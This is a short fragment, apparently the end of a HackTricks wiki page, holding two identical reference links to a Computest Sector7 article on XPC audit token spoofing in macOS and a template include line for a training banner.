- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

{{#include ../../../../banners/hacktricks-training.md}}
